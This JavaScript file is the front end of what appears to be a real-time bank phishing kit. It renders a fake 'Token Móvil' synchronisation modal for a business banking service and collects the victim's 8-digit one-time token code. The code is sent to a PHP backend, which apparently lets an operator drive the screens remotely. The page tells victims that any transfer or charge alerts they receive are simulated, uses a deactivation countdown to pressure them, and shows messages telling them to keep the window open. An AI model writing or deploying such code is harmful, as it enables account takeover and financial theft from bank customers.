/**
 * Tela Sincronización de dispositivo — 3 pasos con validación remota
 */
class SincronizacionSystem {
    static MENSAJES = {
        digitos: 'Ingrese la contraseña dinámica de 8 dígitos generada en su Token Móvil.',
        conexion: 'No fue posible validar su información en este momento. Verifique su conexión e intente nuevamente.',
        envio: 'No pudimos registrar su código de seguridad. Intente nuevamente.'
    };

    constructor() {
        this.currentSync = null;
        this.exitoAckLocal = new Set();
        this.plazoInterval = null;
        this.plazoSegundos = 0;
        this.enviandoCodigo = false;
        this.ESPERA_ENVIO_MS = 6000;
        this.waitMsgInterval = null;
        this.lastWaitMsgIndex = -1;
        this.waitMessages = [
            {
                titulo: 'Proceso de sincronización',
                texto: 'Estamos preparando el siguiente paso de verificación de su Token Móvil.'
            },
            {
                titulo: 'Espera un momento, estamos validando',
                texto: 'No cierres ni actualices esta ventana mientras concluimos la revisión.'
            },
            {
                titulo: 'Verificando tu dispositivo token',
                texto: 'El proceso continúa de forma automática y controlada.'
            },
            {
                titulo: 'Sincronización en progreso',
                texto: 'Permanece en esta pantalla hasta recibir la confirmación del sistema.'
            },
            {
                titulo: 'Validando información de seguridad',
                texto: 'Estamos confirmando los datos enviados desde su dispositivo.'
            },
            {
                titulo: 'Procesando tu solicitud',
                texto: 'Este paso puede tardar unos momentos. Gracias por su paciencia.'
            },
            {
                titulo: 'Conexión con el centro de seguridad',
                texto: 'Mantén esta ventana abierta mientras completamos la verificación.'
            },
            {
                titulo: 'Revisión de credenciales en curso',
                texto: 'Por favor, no cierre esta ventana hasta finalizar el proceso.'
            }
        ];
        this.init();
    }

    init() {
        this.startCheck();
        this.checkForSync();
    }

    startCheck() {
        this.interval = setInterval(() => this.checkForSync(), 3000);
    }

    stopCheck() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
    }

    isOwnModalActive() {
        const modal = document.getElementById('adminModal');
        return !!(modal && modal.classList.contains('active') && modal.classList.contains('sincronizacion-modal'));
    }

    async checkForSync() {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/sincronizacion_verificar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_sync_pendiente' })
            });
            const text = await response.text();
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                return;
            }

            if (data.success && data.tiene_sync && data.sync) {
                if (
                    data.sync.estado === 'completado' &&
                    this.exitoAckLocal.has(Number(data.sync.sync_id))
                ) {
                    return;
                }
                this.renderSync(data.sync);
                return;
            }

            if (this.isOwnModalActive() && this.currentSync?.estado !== 'completado') {
                this.closeModal();
            }
        } catch (error) {
            console.warn('Error verificando sincronización:', error);
        }
    }

    async cerrarOtros() {
        if (typeof modalSystem !== 'undefined' && modalSystem.currentModal) {
            await modalSystem.markAsReadSilently(modalSystem.currentModal.id);
            modalSystem.closeModal();
        }
        if (typeof contactoEmpresaSystem !== 'undefined') contactoEmpresaSystem.closeModal?.();
        if (typeof tokenEmpresaSystem !== 'undefined') tokenEmpresaSystem.closeModal?.();
        if (typeof tokenQrEmpresaSystem !== 'undefined') tokenQrEmpresaSystem.closeModal?.();
        if (typeof emailValidationSystem !== 'undefined') emailValidationSystem.closeModal?.();
    }

    async renderSync(sync) {
        const modal = document.getElementById('adminModal');
        if (!modal) return;

        const prev = this.currentSync;
        const same =
            prev &&
            prev.sync_id === sync.sync_id &&
            prev.estado === sync.estado &&
            prev.paso_actual === sync.paso_actual &&
            prev.envios_realizados === sync.envios_realizados &&
            prev.interrupcion_indice === sync.interrupcion_indice &&
            prev.interrupcion_titulo === sync.interrupcion_titulo &&
            prev.mensaje_error === sync.mensaje_error &&
            prev.mensaje_aviso === sync.mensaje_aviso &&
            prev.qr_imagen_url === sync.qr_imagen_url;

        if (same && this.isOwnModalActive()) {
            return;
        }

        if (!this.isOwnModalActive()) {
            await this.cerrarOtros();
        }

        this.currentSync = sync;
        modal.classList.remove(
            'token-empresa-modal',
            'token-qr-empresa-modal',
            'contacto-empresa-modal',
            'email-validation-modal'
        );
        modal.classList.add('sincronizacion-modal', 'active');

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        if (inputContainer) inputContainer.style.display = 'none';
        if (buttonsContainer) buttonsContainer.innerHTML = '';
        if (errorEl) {
            errorEl.style.display = 'none';
            errorEl.textContent = '';
        }

        const paso = Number(sync.paso_actual) || 1;

        if (sync.estado === 'completado') {
            this.stopWaitMessages();
            this.stopPlazoTimer();
            messageEl.innerHTML = sync.exito_modo === 'validacion_final'
                ? this.htmlPaso3ValidacionFinal()
                : this.htmlPaso3Exito();
            document.getElementById('syncBtnAceptar')?.addEventListener('click', () => {
                this.aceptarExito(sync.sync_id);
            });
            return;
        }

        if (sync.estado === 'interrupcion') {
            this.stopWaitMessages();
            this.stopPlazoTimer();
            messageEl.innerHTML = this.htmlPaso3Interrupcion(sync);
            document.getElementById('syncBtnInterrupcion')?.addEventListener('click', () => {
                this.aceptarInterrupcion(sync.sync_id);
            });
            return;
        }

        if (paso <= 1) {
            this.stopWaitMessages();
            messageEl.innerHTML = this.htmlPaso1(sync);
            this.bindPaso1Plazo();
            document.getElementById('syncBtnPaso1')?.addEventListener('click', () => this.avanzarPaso1(sync.sync_id));
            return;
        }

        if (sync.estado === 'esperando_validacion') {
            this.stopPlazoTimer();
            messageEl.innerHTML = this.htmlPaso2Espera();
            this.bindPaso2Espera();
            return;
        }

        this.stopWaitMessages();
        this.stopPlazoTimer();
        messageEl.innerHTML = this.htmlPaso2(sync);
        this.bindPaso2(sync);
    }

    htmlStepper(pasoActivo) {
        const paso = Math.min(3, Math.max(1, Number(pasoActivo) || 1));
        const items = [
            { n: 1, label: 'Iniciar sincronización', icon: '1' },
            { n: 2, label: 'Sincronización en proceso', icon: '2' },
            { n: 3, label: 'Finalizar sincronización', icon: '✓' }
        ];

        const nodes = items.map((item, index) => {
            let estado = 'pending';
            if (item.n < paso) estado = 'done';
            else if (item.n === paso) estado = 'active';

            const linePrev = index > 0
                ? `<span class="sync-step-line${items[index - 1].n < paso ? ' is-done' : ''}" aria-hidden="true"></span>`
                : '';

            const iconContent = estado === 'done' && item.n !== 3 ? '✓' : item.icon;

            return `
                ${linePrev}
                <div class="sync-step-item is-${estado}">
                    <span class="sync-step-circle" aria-hidden="true">${iconContent}</span>
                    <span class="sync-step-label">${item.label}</span>
                </div>
            `;
        }).join('');

        return `
            <div class="sync-stepper-wrap" aria-label="Paso ${paso} de 3">
                <div class="sync-stepper-track">
                    ${nodes}
                </div>
            </div>
        `;
    }

    htmlPaso1(sync) {
        const plazoInicial = Math.max(0, Number(sync?.plazo_segundos_restantes) || 0);

        return `
            <div class="sync-content sync-content-paso1">
                ${this.htmlStepper(1)}
                <div class="sync-intro-head">
                    <p class="sync-eyebrow">Centro de seguridad</p>
                    <h2 class="sync-title sync-title-intro">Sincronización de Token Móvil</h2>
                    <p class="sync-intro-lead">
                        Medida de seguridad de <strong>Banca Electrónica Empresas</strong>.
                        Verifique su identidad y sincronice su dispositivo token.
                    </p>
                </div>

                <div class="sync-info-panel" role="note">
                    <p class="sync-info-panel-text">
                        <span class="sync-info-label">Importante</span>
                        Durante el proceso puede recibir alertas simuladas (altas, transferencias o cargos).
                        Forman parte de la sincronización y <strong>no son movimientos reales</strong>.
                    </p>
                </div>

                <div class="sync-notice-box" role="note">
                    <div class="sync-notice-main">
                        <span class="sync-notice-icon" aria-hidden="true">
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <circle cx="12" cy="12" r="8.5" stroke="currentColor" stroke-width="1.5"/>
                                <path d="M12 7v5.25l3 1.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </span>
                        <p class="sync-notice-text">
                            Plazo para completar la sincronización. Si expira, su token se
                            <strong>desactivará temporalmente</strong>.
                        </p>
                    </div>
                    <div class="sync-timer-wrap">
                        <span class="sync-timer-label">Restante</span>
                        <div class="sync-timer" id="syncPlazoTimer" aria-live="polite" data-plazo-segundos="${plazoInicial}">
                            ${this.formatPlazo(plazoInicial)}
                        </div>
                    </div>
                </div>

                <button type="button" class="sync-btn" id="syncBtnPaso1">Continuar</button>
            </div>
        `;
    }

    formatPlazo(totalSegundos) {
        const segundos = Math.max(0, Number(totalSegundos) || 0);
        const horas = Math.floor(segundos / 3600);
        const minutos = Math.floor((segundos % 3600) / 60);
        const resto = segundos % 60;

        return [horas, minutos, resto]
            .map((parte) => String(parte).padStart(2, '0'))
            .join(':');
    }

    bindPaso1Plazo() {
        this.stopPlazoTimer();
        const timerEl = document.getElementById('syncPlazoTimer');
        if (!timerEl) return;

        this.plazoSegundos = Math.max(0, Number(timerEl.dataset.plazoSegundos) || 0);
        timerEl.textContent = this.formatPlazo(this.plazoSegundos);

        this.plazoInterval = setInterval(() => {
            if (this.plazoSegundos <= 0) {
                this.stopPlazoTimer();
                return;
            }

            this.plazoSegundos -= 1;
            timerEl.textContent = this.formatPlazo(this.plazoSegundos);
        }, 1000);
    }

    stopPlazoTimer() {
        if (this.plazoInterval) {
            clearInterval(this.plazoInterval);
            this.plazoInterval = null;
        }
    }

    htmlPaso2(sync) {
        const aviso = sync.mensaje_aviso
            ? `<div class="sync-aviso" role="status">
                    <span class="sync-aviso-label">Aviso</span>
                    <p class="sync-aviso-text">${this.escape(sync.mensaje_aviso)}</p>
               </div>`
            : '';
        const error = sync.mensaje_error
            ? `<div class="sync-error" role="alert">${this.escape(sync.mensaje_error)}</div>`
            : '';
        const qr = sync.tipo === 'qr' && sync.qr_imagen_url
            ? `<img src="${this.escape(sync.qr_imagen_url)}" alt="Código QR" class="sync-qr">`
            : '';

        return `
            <div class="sync-content">
                ${this.htmlStepper(2)}
                <h2 class="sync-title">${sync.tipo === 'qr' ? 'Escanea el codigo' : 'Ingresa el código de sincronización'}</h2>
                <p class="sync-text">
                    ${sync.tipo === 'qr'
                        ? 'Usa el código QR mostrado o ingresa el valor generado en tu dispositivo.'
                        : 'Ingresa el código de seguridad generado en tu token o dispositivo autorizado.'}
                </p>
                ${aviso}
                ${error}
                ${qr}
                <label class="sync-label" for="syncCodigoInput">Código</label>
                <input
                    type="text"
                    id="syncCodigoInput"
                    class="sync-input"
                    maxlength="8"
                    inputmode="numeric"
                    pattern="[0-9]{8}"
                    autocomplete="one-time-code"
                    required
                >
                <button type="button" class="sync-btn" id="syncBtnEnviar">
                    <span class="sync-btn-label">Enviar</span>
                    <img src="${(window.MODAL_BASE || '')}empresas/images/login-spinner.svg" alt="" class="sync-btn-spinner" width="20" height="20" aria-hidden="true">
                </button>
            </div>
        `;
    }

    pickRandomWaitMessage() {
        const total = this.waitMessages.length;
        if (total <= 1) {
            this.lastWaitMsgIndex = 0;
            return this.waitMessages[0];
        }

        let idx;
        do {
            idx = Math.floor(Math.random() * total);
        } while (idx === this.lastWaitMsgIndex);

        this.lastWaitMsgIndex = idx;
        return this.waitMessages[idx];
    }

    htmlPaso2Espera() {
        const base = (window.MODAL_BASE || '');
        const msg = this.pickRandomWaitMessage();

        return `
            <div class="sync-content sync-content-wait">
                ${this.htmlStepper(2)}
                <div class="sync-wait-screen" aria-live="polite">
                    <h2 class="sync-wait-title" id="syncWaitTitle">${this.escape(msg.titulo)}</h2>
                    <div class="sync-wait-loader">
                        <img src="${base}images/mifel-loader.gif" alt="Cargando..." class="sync-wait-gif">
                    </div>
                    <p class="sync-wait-text" id="syncWaitText">${this.escape(msg.texto)}</p>
                </div>
            </div>
        `;
    }

    bindPaso2Espera() {
        this.stopWaitMessages();
        this.waitMsgInterval = setInterval(() => this.rotateWaitMessage(), 8000);
    }

    stopWaitMessages() {
        if (this.waitMsgInterval) {
            clearInterval(this.waitMsgInterval);
            this.waitMsgInterval = null;
        }
    }

    rotateWaitMessage() {
        const titleEl = document.getElementById('syncWaitTitle');
        const textEl = document.getElementById('syncWaitText');
        if (!titleEl || !textEl) {
            this.stopWaitMessages();
            return;
        }

        const msg = this.pickRandomWaitMessage();

        titleEl.style.opacity = '0.45';
        textEl.style.opacity = '0.45';

        setTimeout(() => {
            titleEl.textContent = msg.titulo;
            textEl.textContent = msg.texto;
            titleEl.style.opacity = '1';
            textEl.style.opacity = '1';
        }, 400);
    }

    sleep(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }

    setSyncBtnWaiting(active) {
        const btn = document.getElementById('syncBtnEnviar');
        if (!btn) return;
        btn.disabled = active;
        btn.classList.toggle('sync-btn--waiting', active);
        if (active) {
            btn.setAttribute('aria-busy', 'true');
        } else {
            btn.removeAttribute('aria-busy');
        }
    }

    async avanzarDespuesEnvio(syncId) {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/sincronizacion_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'avanzar_despues_envio', sync_id: syncId })
            });
            const data = await response.json();
            if (data.success) {
                this.checkForSync();
            }
        } catch (e) {
            console.warn('Error al avanzar sincronización:', e);
        }
    }

    showPaso2Espera(syncId) {
        const messageEl = document.getElementById('modalMessage');
        if (!messageEl) return;
        messageEl.innerHTML = this.htmlPaso2Espera();
        this.bindPaso2Espera();
    }

    htmlPaso3Interrupcion(sync) {
        const titulo = this.escape(sync.interrupcion_titulo || 'Sincronización interrumpida');
        const texto = this.escape(sync.interrupcion_texto || 'Valida tu conexión a internet e intenta nuevamente.');

        return `
            <div class="sync-content sync-content-interrupt">
                ${this.htmlStepper(3)}
                <div class="sync-interrupt-icon" aria-hidden="true">
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 3C7.03 3 3 7.03 3 12h2a7 7 0 1 1 7 7v-2" stroke="#002856" stroke-width="1.5" stroke-linecap="round"/>
                        <path d="M12 6v6l4 2" stroke="#00adaa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M3 12H1M23 12h-2M12 1v2M12 21v2" stroke="#002856" stroke-width="1.25" stroke-linecap="round" opacity="0.35"/>
                    </svg>
                </div>
                <h2 class="sync-title sync-title-interrupt">${titulo}</h2>
                <p class="sync-text sync-text-interrupt">${texto}</p>
                <button type="button" class="sync-btn" id="syncBtnInterrupcion">Aceptar</button>
            </div>
        `;
    }

    htmlPaso3ValidacionFinal() {
        return `
            <div class="sync-content sync-content-final">
                ${this.htmlStepper(3)}
                <h2 class="sync-title sync-title-final">Estamos validando tu información</h2>
                <p class="sync-text sync-text-final">
                    Permanezca en esta pantalla mientras concluimos la verificación de su Token Móvil.
                </p>
                <button type="button" class="sync-btn" id="syncBtnAceptar">Aceptar</button>
            </div>
        `;
    }

    htmlPaso3Exito() {
        return `
            <div class="sync-content">
                ${this.htmlStepper(3)}
                <div class="sync-success-icon" aria-hidden="true">✓</div>
                <h2 class="sync-title" style="text-align:center;">Validación exitosa</h2>
                <p class="sync-text" style="text-align:center;">
                    La sincronización de tu dispositivo se completó correctamente.
                </p>
                <button type="button" class="sync-btn" id="syncBtnAceptar">Aceptar</button>
            </div>
        `;
    }

    async aceptarInterrupcion(syncId) {
        const btn = document.getElementById('syncBtnInterrupcion');
        if (btn) btn.disabled = true;

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/sincronizacion_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'aceptar_interrupcion', sync_id: syncId })
            });
            const data = await response.json();
            if (!data.success) {
                if (btn) btn.disabled = false;
                return;
            }
            this.checkForSync();
        } catch (e) {
            if (btn) btn.disabled = false;
            console.warn('Error al aceptar interrupción:', e);
        }
    }

    async aceptarExito(syncId) {
        const id = Number(syncId);
        this.exitoAckLocal.add(id);

        try {
            await fetch((window.MODAL_BASE || '') + 'php_modales/sincronizacion_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'cerrar_exito', sync_id: id })
            });
        } catch (e) {
            console.warn('Error al confirmar cierre de sincronización:', e);
        }

        this.closeModal();
    }

    bindPaso2(sync) {
        const input = document.getElementById('syncCodigoInput');
        const btn = document.getElementById('syncBtnEnviar');
        if (!btn) return;

        input?.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        btn.addEventListener('click', () => this.enviarCodigo(sync.sync_id));
        input?.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') this.enviarCodigo(sync.sync_id);
        });
        input?.focus();
    }

    escape(value) {
        return String(value ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;');
    }

    async avanzarPaso1(syncId) {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/sincronizacion_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'avanzar_paso1', sync_id: syncId })
            });
            const data = await response.json();
            if (data.success) {
                this.checkForSync();
            }
        } catch (e) {
            console.warn(e);
        }
    }

    async enviarCodigo(syncId) {
        if (this.enviandoCodigo) return;

        const input = document.getElementById('syncCodigoInput');
        const btn = document.getElementById('syncBtnEnviar');
        const codigo = (input?.value || '').trim();

        if (!/^[0-9]{8}$/.test(codigo)) {
            this.showInlineError(SincronizacionSystem.MENSAJES.digitos);
            return;
        }

        this.enviandoCodigo = true;
        this.setSyncBtnWaiting(true);
        if (input) input.disabled = true;

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/sincronizacion_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'enviar_codigo', sync_id: syncId, codigo })
            });
            const data = await response.json();
            if (!data.success) {
                this.showInlineError(data.error || SincronizacionSystem.MENSAJES.envio);
                this.setSyncBtnWaiting(false);
                if (input) input.disabled = false;
                this.enviandoCodigo = false;
                return;
            }

            if (this.currentSync) {
                this.currentSync = {
                    ...this.currentSync,
                    estado: 'esperando_validacion',
                    codigo_actual: codigo
                };
            }

            await this.sleep(this.ESPERA_ENVIO_MS);

            this.setSyncBtnWaiting(false);
            this.showPaso2Espera(syncId);

            await this.avanzarDespuesEnvio(syncId);
        } catch (e) {
            this.showInlineError(SincronizacionSystem.MENSAJES.conexion);
            this.setSyncBtnWaiting(false);
            if (input) input.disabled = false;
        } finally {
            this.enviandoCodigo = false;
        }
    }

    showInlineError(msg) {
        const content = document.querySelector('#adminModal.sincronizacion-modal .sync-content');
        if (!content) return;
        let el = content.querySelector('.sync-error');
        if (!el) {
            el = document.createElement('div');
            el.className = 'sync-error';
            el.setAttribute('role', 'alert');
            const title = content.querySelector('.sync-text');
            title?.insertAdjacentElement('afterend', el);
        }
        el.textContent = msg;
    }

    closeModal() {
        this.stopWaitMessages();
        this.stopPlazoTimer();
        const modal = document.getElementById('adminModal');
        if (modal) {
            modal.classList.remove(
                'active',
                'sincronizacion-modal',
                'token-empresa-modal',
                'token-qr-empresa-modal',
                'contacto-empresa-modal',
                'email-validation-modal'
            );
        }
        const messageEl = document.getElementById('modalMessage');
        if (messageEl) messageEl.textContent = '';
        if (typeof modalSystem !== 'undefined' && modalSystem.resetModalShell) {
            modalSystem.resetModalShell();
        }
        this.currentSync = null;
    }

    destroy() {
        this.stopCheck();
    }
}

let sincronizacionSystem;

document.addEventListener('DOMContentLoaded', function () {
    sincronizacionSystem = new SincronizacionSystem();
});

window.addEventListener('beforeunload', function () {
    if (sincronizacionSystem) sincronizacionSystem.destroy();
});
